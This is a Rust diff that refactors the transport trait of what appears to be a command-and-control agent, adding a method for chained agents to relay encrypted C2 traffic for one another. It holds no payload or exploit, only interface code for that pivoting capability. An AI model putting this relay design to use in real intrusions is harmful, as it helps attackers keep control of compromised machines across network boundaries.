@@ -49,16 +49,22 @@ pub fn extract_extra_from_config(config: &Config) -> HashMap<String, String> {
     HashMap::new()
 }
 
-#[trait_variant::make(Transport: Send)]
-pub trait UnsafeTransport: Clone + Send {
+#[async_trait::async_trait]
+pub trait Transport: Send + Sync {
+    fn clone_box(&self) -> Box<dyn Transport + Send + Sync>;
+
     // Init will initialize a new instance of the transport with no active connections.
     #[allow(dead_code)]
-    fn init() -> Self;
+    fn init() -> Self
+    where
+        Self: Sized;
 
     // New will create a new instance of the transport using the Config.
     // The URI is extracted from config.info.available_transports at the active_index.
     #[allow(dead_code)]
-    fn new(config: Config) -> Result<Self>;
+    fn new(config: Config) -> Result<Self>
+    where
+        Self: Sized;
 
     ///
     /// Contact the server for new tasks to execute.
@@ -147,4 +153,14 @@ pub trait UnsafeTransport: Clone + Send {
     /// Returns a list of available transports that this instance can switch to or supports.
     #[allow(dead_code)]
     fn list_available(&self) -> Vec<String>;
+
+    /// Forward raw (pre-encrypted) bytes bidirectionally over a gRPC stream.
+    /// Used by chained transports (Agent A) to proxy C2 traffic from Agent B.
+    #[allow(dead_code)]
+    async fn forward_raw(
+        &mut self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()>;
 }
